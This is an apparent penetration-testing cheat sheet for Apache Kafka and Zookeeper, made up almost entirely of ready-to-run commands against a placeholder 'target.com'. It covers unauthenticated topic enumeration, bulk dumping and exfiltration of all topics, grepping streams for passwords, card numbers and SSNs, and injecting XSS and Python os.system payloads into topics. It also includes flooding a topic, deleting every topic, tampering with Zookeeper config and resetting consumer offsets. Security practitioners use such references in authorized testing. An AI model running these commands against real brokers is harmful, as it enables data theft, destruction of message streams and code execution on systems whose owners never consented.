# Kafka

**`Default Ports: 9092 (Broker), 9093 (SSL), 2181 (Zookeeper)`**

**Apache Kafka** is a distributed event streaming platform used for building real-time data pipelines and streaming applications. It's designed for high-throughput, fault-tolerant, and scalable message processing. Kafka is widely used in microservices architectures, log aggregation, real-time analytics, and event-driven systems. Misconfigured Kafka instances can expose sensitive data streams, allow message injection, and provide paths to compromise connected systems.

### Connect <a href="#connect" id="connect"></a>

#### Using kafka-console-consumer <a href="#using-kafka-console-consumer" id="using-kafka-console-consumer"></a>

The console consumer allows you to read messages from Kafka topics in real-time.

**Basic Message Consumption**

```
# Consume from topic
kafka-console-consumer --bootstrap-server target.com:9092 --topic topic-name --from-beginning

# With consumer group
kafka-console-consumer --bootstrap-server target.com:9092 \
  --topic topic-name \
  --group my-group \
  --from-beginning

# Consume latest messages only
kafka-console-consumer --bootstrap-server target.com:9092 --topic topic-name
```

**Authenticated Consumption**

```
# With authentication (if SASL enabled)
kafka-console-consumer --bootstrap-server target.com:9092 \
  --topic topic-name \
  --consumer-property security.protocol=SASL_PLAINTEXT \
  --consumer-property sasl.mechanism=PLAIN \
  --consumer-property sasl.jaas.config='org.apache.kafka.common.security.plain.PlainLoginModule required username="user" password="password";'
```

#### Using kafka-console-producer <a href="#using-kafka-console-producer" id="using-kafka-console-producer"></a>

The console producer allows you to publish messages to Kafka topics.

**Basic Message Production**

```
# Produce messages to topic
kafka-console-producer --bootstrap-server target.com:9092 --topic topic-name

# Then type messages and press Enter
# Each line becomes a message
```

**Advanced Production Methods**

```
# From file
cat messages.txt | kafka-console-producer --bootstrap-server target.com:9092 --topic topic-name

# With key-value pairs
kafka-console-producer --bootstrap-server target.com:9092 \
  --topic topic-name \
  --property "parse.key=true" \
  --property "key.separator=:"
```

#### Using kafkacat (kcat) <a href="#using-kafkacat-kcat" id="using-kafkacat-kcat"></a>

kafkacat is a versatile command-line Kafka producer and consumer.

**Basic kafkacat Operations**

```
# List metadata (topics, brokers)
kafkacat -b target.com:9092 -L

# Consume messages
kafkacat -b target.com:9092 -t topic-name -C

# Produce messages
echo "test message" | kafkacat -b target.com:9092 -t topic-name -P
```

**Advanced kafkacat Features**

```
# Consumer with offset
kafkacat -b target.com:9092 -t topic-name -C -o beginning

# JSON output
kafkacat -b target.com:9092 -t topic-name -C -J
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use `Nmap` to detect Kafka brokers and check for open ports:

```
nmap -p 9092,9093,2181 -sV target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

```
# Kafka banner grab
echo "." | nc target.com 9092 | xxd

# Zookeeper detection
echo "dump" | nc target.com 2181
```

#### Cluster Discovery <a href="#cluster-discovery" id="cluster-discovery"></a>

Kafka brokers can be discovered through various methods including DNS, Zookeeper, or direct connection.

```
# List brokers via kafkacat
kafkacat -b target.com:9092 -L

# Get broker IDs
kafkacat -b target.com:9092 -L | grep "broker"

# Check Zookeeper (if accessible)
echo "dump" | nc target.com:2181
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Topic Enumeration <a href="#topic-enumeration" id="topic-enumeration"></a>

Topics are the core of Kafka's publish-subscribe model and often contain sensitive data streams.

**List and Describe Topics**

```
# List all topics
kafka-topics --bootstrap-server target.com:9092 --list

# Using kafkacat
kafkacat -b target.com:9092 -L | grep topic

# Topic details
kafka-topics --bootstrap-server target.com:9092 --describe --topic topic-name

# All topic configurations
kafka-topics --bootstrap-server target.com:9092 --describe
```

**Topic Analysis**

```
# Count messages in topic
kafka-run-class kafka.tools.GetOffsetShell \
  --broker-list target.com:9092 \
  --topic topic-name \
  --time -1
```

#### Consumer Group Enumeration <a href="#consumer-group-enumeration" id="consumer-group-enumeration"></a>

Consumer groups track which messages have been processed and can reveal active consumers.

**List Consumer Groups**

```
# List consumer groups
kafka-consumer-groups --bootstrap-server target.com:9092 --list

# Describe consumer group
kafka-consumer-groups --bootstrap-server target.com:9092 \
  --describe --group group-name

# All groups
kafka-consumer-groups --bootstrap-server target.com:9092 --all-groups --describe
```

**Consumer Group Analysis**

```
# Check lag (unprocessed messages)
kafka-consumer-groups --bootstrap-server target.com:9092 \
  --describe --group group-name \
  --members
```

#### Message Content Analysis <a href="#message-content-analysis" id="message-content-analysis"></a>

Examining message content can reveal sensitive data, credentials, and application logic.

**Sensitive Data Search**

```
# Consume and analyze messages
kafka-console-consumer --bootstrap-server target.com:9092 \
  --topic topic-name \
  --from-beginning | grep -i "password\|secret\|token\|key"
```

**Message Extraction and Analysis**

```
# Save messages for offline analysis
kafkacat -b target.com:9092 -t topic-name -C -e > messages.txt

# Extract JSON messages
kafkacat -b target.com:9092 -t topic-name -C -J | jq .

# Count messages by pattern
kafkacat -b target.com:9092 -t topic-name -C | grep -c "error"
```

#### ACL and Permission Enumeration <a href="#acl-and-permission-enumeration" id="acl-and-permission-enumeration"></a>

Kafka Access Control Lists (ACLs) define who can access topics.

```
# List ACLs (requires authentication)
kafka-acls --bootstrap-server target.com:9092 --list

# ACLs for specific topic
kafka-acls --bootstrap-server target.com:9092 --list --topic topic-name

# Check if ACLs are enabled
# If no ACLs exist, Kafka may allow open access
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### No Authentication <a href="#no-authentication" id="no-authentication"></a>

Many Kafka installations lack authentication, allowing anyone to read/write messages.

**Test Authentication**

```
# Test if authentication is required
kafkacat -b target.com:9092 -L

# If broker list returns successfully, no auth required
```

**Unauthorized Access**

```
# Read all topics
for topic in $(kafkacat -b target.com:9092 -L | grep topic | awk '{print $2}'); do
  echo "[*] Topic: $topic"
  kafkacat -b target.com:9092 -t $topic -C -c 10
done
```

#### Message Injection <a href="#message-injection" id="message-injection"></a>

If you have producer access, you can inject malicious messages into topics.

**Malicious Message Injection**

```
# Inject malicious message
echo '{"user":"admin","action":"delete_all","confirmed":true}' | \
  kafkacat -b target.com:9092 -t commands -P

# Message poisoning for JSON consumers
echo '{"id":"<script>alert(1)</script>"}' | \
  kafkacat -b target.com:9092 -t user-events -P

# Inject code execution payload (if consumers eval messages)
echo '{"cmd":"__import__(\"os\").system(\"whoami\")"}' | \
  kafkacat -b target.com:9092 -t tasks -P
```

**Denial of Service**

```
# Flood topic with messages (DoS)
for i in {1..100000}; do
  echo "spam message $i" | kafkacat -b target.com:9092 -t topic -P
done
```

#### Message Interception <a href="#message-interception" id="message-interception"></a>

Reading sensitive data from Kafka topics without authorization can expose credentials, personal data, and business logic.

**Topic Discovery**

```
# Common sensitive topics to check
for topic in users passwords transactions payments logs audit events; do
  kafkacat -b target.com:9092 -t $topic -C -c 100 2>/dev/null && echo "[+] Found topic: $topic"
done
```

**Real-time Monitoring**

```
kafkacat -b target.com:9092 -t payment-events -C | \
  grep -i "credit_card\|ssn\|password"
```

**Bulk Extraction**

```
for topic in $(kafkacat -b target.com:9092 -L | grep topic | awk '{print $2}'); do
  kafkacat -b target.com:9092 -t $topic -C -e > "${topic}_messages.txt"
done
```

#### Zookeeper Exploitation <a href="#zookeeper-exploitation" id="zookeeper-exploitation"></a>

Kafka relies on Zookeeper for coordination - compromising Zookeeper compromises Kafka.

**Zookeeper Access**

```
# Connect to Zookeeper
echo "dump" | nc target.com:2181

# List Kafka nodes in Zookeeper
echo "ls /brokers/ids" | zkCli.sh -server target.com:2181

# Get broker information
echo "get /brokers/ids/0" | zkCli.sh -server target.com:2181
```

**Configuration Manipulation**

```
# Modify Kafka configuration via Zookeeper
echo "set /config/topics/topic-name {\"config\":{\"retention.ms\":\"1000\"}}" | zkCli.sh -server target.com:2181
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

Extracting all messages from Kafka for offline analysis.

**Export All Topics**

```
# Export all topics
for topic in $(kafkacat -b target.com:9092 -L | grep topic | awk '{print $2}'); do
  echo "[*] Exfiltrating topic: $topic"
  kafkacat -b target.com:9092 -t $topic -C -e -o beginning > "${topic}_export.json"
  # -e: exit when last message received
  # -o beginning: start from first message
done
```

**Compress and Transfer**

```
# Compress and transfer
tar czf kafka_exfil.tar.gz *_export.json
# Transfer to attacker server
```

#### Topic Deletion (DoS) <a href="#topic-deletion-dos" id="topic-deletion-dos"></a>

Deleting topics can cause application failures and data loss.

**Single Topic Deletion**

```
# Delete topic (if delete.topic.enable=true)
kafka-topics --bootstrap-server target.com:9092 --delete --topic topic-name
```

**Mass Topic Deletion**

```
# Delete all topics
for topic in $(kafka-topics --bootstrap-server target.com:9092 --list); do
  kafka-topics --bootstrap-server target.com:9092 --delete --topic $topic
done
```

#### Consumer Group Manipulation <a href="#consumer-group-manipulation" id="consumer-group-manipulation"></a>

Manipulating consumer group offsets can cause message reprocessing or skipping.

**Offset Reset to Beginning**

```
# Reset consumer group to beginning (reprocess all messages)
kafka-consumer-groups --bootstrap-server target.com:9092 \
  --group group-name \
  --topic topic-name \
  --reset-offsets --to-earliest \
  --execute
```

**Offset Reset to Latest**

```
# Skip all unprocessed messages
kafka-consumer-groups --bootstrap-server target.com:9092 \
  --group group-name \
  --topic topic-name \
  --reset-offsets --to-latest \
  --execute
```

### Kafka Security Mechanisms <a href="#kafka-security-mechanisms" id="kafka-security-mechanisms"></a>

| Feature        | Purpose                | Bypass Risk                         |
| -------------- | ---------------------- | ----------------------------------- |
| SASL/PLAIN     | Username/password auth | Brute force, weak passwords         |
| SASL/SCRAM     | Salted challenge auth  | Offline cracking if intercepted     |
| SSL/TLS        | Encryption in transit  | MITM if cert validation disabled    |
| ACLs           | Authorization          | Misconfiguration, overly permissive |
| Zookeeper ACLs | Coordination security  | Direct Zookeeper access             |

### Common Kafka Topics to Target <a href="#common-kafka-topics-to-target" id="common-kafka-topics-to-target"></a>

| Topic Pattern   | Likely Contains          | Value    |
| --------------- | ------------------------ | -------- |
| `*user*`        | User data, credentials   | High     |
| `*auth*`        | Authentication events    | High     |
| `*password*`    | Password resets, changes | Critical |
| `*payment*`     | Payment transactions     | Critical |
| `*log*`         | Application logs         | Medium   |
| `*event*`       | User/system events       | Medium   |
| `*transaction*` | Business transactions    | High     |
| `*audit*`       | Audit trails             | Medium   |

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool                  | Description         | Primary Use Case      |
| --------------------- | ------------------- | --------------------- |
| kafkacat/kcat         | Kafka CLI           | Topic interaction     |
| kafka-console-\*      | Official tools      | Message operations    |
| kafka-topics          | Topic management    | Topic operations      |
| kafka-consumer-groups | Consumer management | Group operations      |
| Burp Suite            | Web proxy           | API testing           |
| zkCli                 | Zookeeper CLI       | Zookeeper interaction |

### Security Misconfigurations <a href="#security-misconfigurations" id="security-misconfigurations"></a>

* ❌ No authentication (SASL disabled)
* ❌ No authorization (ACLs not configured)
* ❌ No encryption (plaintext communication)
* ❌ Zookeeper accessible without auth
* ❌ Exposed to internet
* ❌ Default ports open
* ❌ Auto-create topics enabled
* ❌ delete.topic.enable=true (topic deletion allowed)
* ❌ No message encryption at rest
* ❌ Overly permissive ACLs
* ❌ No audit logging
* ❌ Weak SASL credentials
* ❌ SSL certificate validation disabled

<br>
